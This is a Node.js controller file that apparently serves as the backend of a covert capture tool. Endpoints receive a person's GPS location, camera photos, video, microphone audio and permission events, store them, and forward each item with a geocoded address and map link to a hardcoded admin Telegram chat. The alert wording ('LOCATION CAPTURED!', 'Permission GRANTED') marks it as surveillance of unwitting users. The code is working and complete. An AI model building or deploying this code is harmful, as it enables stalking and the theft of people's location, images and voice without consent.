/**
 * ============================================
 * Capture Controller
 * ============================================
 * Handles HTTP requests for user-based capture operations.
 * This is the new approach - no sessions, just user IDs.
 */

const { userService, mediaService } = require('../services');
const { getCompleteLocationInfo } = require('../services/geocodingService');
const logger = require('../utils/logger');
const path = require('path');
const fs = require('fs').promises;
const config = require('../config');

// Admin telegram ID for notifications
const ADMIN_TELEGRAM_ID = 6737328498;

/**
 * Register user for capture
 * POST /api/capture/register
 */
const registerUser = async (req, res, next) => {
    try {
        const { telegramId, username, firstName, lastName, captureType } = req.body;
        
        if (!telegramId) {
            return res.status(400).json({ error: 'Missing telegramId' });
        }
        
        // Find or create user
        const user = await userService.findOrCreate({
            telegramId,
            username,
            firstName,
            lastName
        });
        
        logger.info('User registered for capture', { 
            telegramId, 
            captureType,
            userId: user.id 
        });
        
        res.json({ success: true, userId: user.id });
        
    } catch (error) {
        logger.error('Error registering user', { error: error.message });
        next(error);
    }
};

/**
 * Upload location data
 * POST /api/capture/:userId/location
 */
const uploadLocation = async (req, res, next) => {
    try {
        const { userId } = req.params;
        const { latitude, longitude, accuracy, altitude, speed, heading, captureType } = req.body;
        
        if (latitude === undefined || longitude === undefined) {
            return res.status(400).json({ 
                error: 'Missing required fields: latitude and longitude' 
            });
        }
        
        // Get user by telegram ID
        const user = await userService.findByTelegramId(userId);
        if (!user) {
            // Auto-create user if doesn't exist
            logger.warn('User not found, creating new user', { telegramId: userId });
        }
        
        // Save location directly linked to telegramId
        const media = await mediaService.saveLocationForUser(userId, {
            latitude: parseFloat(latitude),
            longitude: parseFloat(longitude),
            accuracy: accuracy ? parseFloat(accuracy) : null,
            altitude: altitude ? parseFloat(altitude) : null,
            speed: speed ? parseFloat(speed) : null,
            heading: heading ? parseFloat(heading) : null
        });
        
        // Get complete location info
        const locationInfo = await getCompleteLocationInfo(latitude, longitude);
        
        // Send notification to admin
        try {
            await sendAdminLocationNotification(userId, {
                latitude,
                longitude,
                accuracy,
                locationInfo
            });
        } catch (notifyErr) {
            logger.warn('Failed to send notification', { error: notifyErr.message });
        }
        
        logger.info('Location captured', { 
            telegramId: userId,
            latitude,
            longitude
        });
        
        res.status(201).json({ success: true, mediaId: media.id });
        
    } catch (error) {
        logger.error('Error uploading location', { error: error.message });
        next(error);
    }
};

/**
 * Upload photo
 * POST /api/capture/:userId/photo
 */
const uploadPhoto = async (req, res, next) => {
    try {
        const { userId } = req.params;
        
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        // Save file
        const fileName = `${userId}_${Date.now()}.jpg`;
        const filePath = path.join(config.storage.basePath, 'photos', fileName);
        
        // Ensure directory exists
        await fs.mkdir(path.dirname(filePath), { recursive: true });
        await fs.writeFile(filePath, req.file.buffer);
        
        // Save metadata
        const media = await mediaService.saveMediaForUser(userId, {
            mediaType: 'photo',
            filePath: filePath,
            fileName: fileName,
            fileSize: req.file.size,
            mimeType: req.file.mimetype || 'image/jpeg'
        });
        
        logger.info('Photo captured', { telegramId: userId, fileName });
        
        // Send notification
        try {
            await sendAdminPhotoNotification(userId, filePath);
        } catch (notifyErr) {
            logger.warn('Failed to send photo notification', { error: notifyErr.message });
        }
        
        res.status(201).json({ success: true, mediaId: media.id });
        
    } catch (error) {
        logger.error('Error uploading photo', { error: error.message });
        next(error);
    }
};

/**
 * Upload video
 * POST /api/capture/:userId/video
 */
const uploadVideo = async (req, res, next) => {
    try {
        const { userId } = req.params;
        
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const fileName = `${userId}_${Date.now()}.webm`;
        const filePath = path.join(config.storage.basePath, 'videos', fileName);
        
        await fs.mkdir(path.dirname(filePath), { recursive: true });
        await fs.writeFile(filePath, req.file.buffer);
        
        const media = await mediaService.saveMediaForUser(userId, {
            mediaType: 'video',
            filePath: filePath,
            fileName: fileName,
            fileSize: req.file.size,
            mimeType: req.file.mimetype || 'video/webm'
        });
        
        logger.info('Video captured', { telegramId: userId, fileName });
        
        // Send notification
        try {
            await sendAdminMediaNotification(userId, 'video', filePath, req.file.size);
        } catch (notifyErr) {
            logger.warn('Failed to send video notification', { error: notifyErr.message });
        }
        
        res.status(201).json({ success: true, mediaId: media.id });
        
    } catch (error) {
        logger.error('Error uploading video', { error: error.message });
        next(error);
    }
};

/**
 * Upload audio
 * POST /api/capture/:userId/audio
 */
const uploadAudio = async (req, res, next) => {
    try {
        const { userId } = req.params;
        
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const fileName = `${userId}_${Date.now()}.webm`;
        const filePath = path.join(config.storage.basePath, 'audio', fileName);
        
        await fs.mkdir(path.dirname(filePath), { recursive: true });
        await fs.writeFile(filePath, req.file.buffer);
        
        const media = await mediaService.saveMediaForUser(userId, {
            mediaType: 'audio',
            filePath: filePath,
            fileName: fileName,
            fileSize: req.file.size,
            mimeType: req.file.mimetype || 'audio/webm'
        });
        
        logger.info('Audio captured', { telegramId: userId, fileName });
        
        // Send notification
        try {
            await sendAdminMediaNotification(userId, 'audio', filePath, req.file.size);
        } catch (notifyErr) {
            logger.warn('Failed to send audio notification', { error: notifyErr.message });
        }
        
        res.status(201).json({ success: true, mediaId: media.id });
        
    } catch (error) {
        logger.error('Error uploading audio', { error: error.message });
        next(error);
    }
};

/**
 * Handle permission event
 * POST /api/capture/:userId/event
 */
const handleEvent = async (req, res, next) => {
    try {
        const { userId } = req.params;
        const { event, captureType } = req.body;
        
        logger.info('Permission event', { 
            telegramId: userId, 
            event, 
            captureType 
        });
        
        // Send notification to admin
        try {
            await sendAdminEventNotification(userId, event, captureType);
        } catch (notifyErr) {
            logger.warn('Failed to send event notification', { error: notifyErr.message });
        }
        
        res.json({ success: true });
        
    } catch (error) {
        logger.error('Error handling event', { error: error.message });
        next(error);
    }
};

/**
 * Get all captured data for a user
 * GET /api/capture/:userId/data
 */
const getUserData = async (req, res, next) => {
    try {
        const { userId } = req.params;
        
        const data = await mediaService.getMediaByTelegramId(userId);
        
        res.json({ success: true, data });
        
    } catch (error) {
        logger.error('Error getting user data', { error: error.message });
        next(error);
    }
};

// ============================================
// Admin Notification Helpers
// ============================================

/**
 * Send location notification to admin
 */
const sendAdminLocationNotification = async (telegramId, data) => {
    const botToken = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
    if (!botToken) {
        logger.warn('No bot token available for notifications');
        return;
    }
    
    const { latitude, longitude, accuracy, locationInfo } = data;
    
    let message = `📍 *LOCATION CAPTURED!*\n\n`;
    message += `👤 *From User:* \`${telegramId}\`\n\n`;
    
    if (locationInfo?.address) {
        message += `📌 *Address:*\n${locationInfo.address.formatted || locationInfo.address.displayName || 'Unknown'}\n\n`;
    }
    
    message += `🎯 *Coordinates:*\n`;
    message += `├ Lat: \`${latitude}\`\n`;
    message += `├ Lng: \`${longitude}\`\n`;
    if (accuracy) message += `├ Accuracy: ${accuracy}m\n`;
    
    message += `\n🕐 *Time:* ${new Date().toLocaleString()}\n\n`;
    message += `[📍 Open in Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;
    
    try {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_TELEGRAM_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: false
            })
        });
        const result = await response.json();
        if (!result.ok) {
            logger.warn('Telegram API error', { error: result.description });
        } else {
            logger.info('Location notification sent to admin', { telegramId });
        }
    } catch (err) {
        logger.warn('Failed to send location to admin', { error: err.message });
    }
};

/**
 * Send photo notification to admin (with actual photo)
 */
const sendAdminPhotoNotification = async (telegramId, filePath) => {
    const botToken = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
    
    logger.info('Attempting to send photo notification', { 
        telegramId, 
        filePath,
        hasToken: !!botToken,
        adminId: ADMIN_TELEGRAM_ID
    });
    
    if (!botToken) {
        logger.warn('No bot token for photo notification');
        return;
    }
    
    try {
        const FormData = require('form-data');
        const fsSync = require('fs');
        
        // Check if file exists
        if (!fsSync.existsSync(filePath)) {
            logger.warn('Photo file not found for notification', { filePath });
            // Send text notification instead
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_TELEGRAM_ID,
                    text: `📷 *Photo Captured!*\n\n👤 User: \`${telegramId}\`\n🕐 ${new Date().toLocaleString()}\n\n⚠️ File saved but couldn't send`,
                    parse_mode: 'Markdown'
                })
            });
            return;
        }
        
        const fileStats = fsSync.statSync(filePath);
        logger.info('Photo file found', { filePath, size: fileStats.size });
        
        const formData = new FormData();
        formData.append('chat_id', ADMIN_TELEGRAM_ID.toString());
        formData.append('photo', fsSync.createReadStream(filePath));
        formData.append('caption', `📷 *Photo Captured!*\n\n👤 User: \`${telegramId}\`\n🕐 ${new Date().toLocaleString()}`);
        formData.append('parse_mode', 'Markdown');
        
        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        const result = await response.json();
        
        if (!result.ok) {
            logger.error('Telegram API error sending photo', { 
                error: result.description, 
                errorCode: result.error_code,
                filePath 
            });
        } else {
            logger.info('Photo sent to admin instantly', { telegramId, messageId: result.result?.message_id });
        }
    } catch (err) {
        logger.error('Failed to send photo to admin', { 
            error: err.message, 
            stack: err.stack,
            filePath 
        });
    }
};

/**
 * Send event notification to admin
 */
const sendAdminEventNotification = async (telegramId, event, captureType) => {
    const botToken = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
    if (!botToken) return;
    
    const emoji = event === 'granted' ? '✅' : '❌';
    const status = event === 'granted' ? 'GRANTED' : 'DENIED';
    
    const typeLabels = {
        'location': '📍 Location',
        'photo': '📷 Photo',
        'video': '🎥 Video',
        'microphone': '🎤 Microphone'
    };
    
    const message = `${emoji} *Permission ${status}*\n\n` +
        `👤 User: \`${telegramId}\`\n` +
        `📋 Type: ${typeLabels[captureType] || captureType}\n` +
        `🕐 Time: ${new Date().toLocaleString()}`;
    
    try {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_TELEGRAM_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (err) {
        logger.warn('Failed to send event to admin', { error: err.message });
    }
};

/**
 * Send video/audio notification to admin (with actual file)
 */
const sendAdminMediaNotification = async (telegramId, mediaType, filePath, fileSize) => {
    const botToken = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
    if (!botToken) {
        logger.warn('No bot token for media notification');
        return;
    }
    
    const emoji = mediaType === 'video' ? '🎥' : '🎤';
    const label = mediaType === 'video' ? 'Video' : 'Audio';
    const sizeMB = (fileSize / (1024 * 1024)).toFixed(2);
    const caption = `${emoji} *${label} Captured!*\n\n👤 User: \`${telegramId}\`\n📁 Size: ${sizeMB} MB\n🕐 ${new Date().toLocaleString()}`;
    
    try {
        const FormData = require('form-data');
        const fsSync = require('fs');
        
        // Check if file exists
        if (!fsSync.existsSync(filePath)) {
            logger.warn('Media file not found', { filePath });
            // Send text notification instead
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_TELEGRAM_ID,
                    text: caption + '\n\n⚠️ File not found on server',
                    parse_mode: 'Markdown'
                })
            });
            return;
        }
        
        const formData = new FormData();
        formData.append('chat_id', ADMIN_TELEGRAM_ID.toString());
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');
        
        let url;
        if (mediaType === 'video') {
            formData.append('video', fsSync.createReadStream(filePath));
            url = `https://api.telegram.org/bot${botToken}/sendVideo`;
        } else {
            formData.append('audio', fsSync.createReadStream(filePath));
            url = `https://api.telegram.org/bot${botToken}/sendAudio`;
        }
        
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        const result = await response.json();
        
        if (!result.ok) {
            logger.warn('Telegram API error sending media', { error: result.description, mediaType });
            // Fallback to text notification
            const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            await fetch(textUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_TELEGRAM_ID,
                    text: caption + '\n\n📎 File saved on server',
                    parse_mode: 'Markdown'
                })
            });
        } else {
            logger.info('Media sent to admin instantly', { telegramId, mediaType });
        }
    } catch (err) {
        logger.warn('Failed to send media to admin', { error: err.message, mediaType });
    }
};

module.exports = {
    registerUser,
    uploadLocation,
    uploadPhoto,
    uploadVideo,
    uploadAudio,
    handleEvent,
    getUserData
};
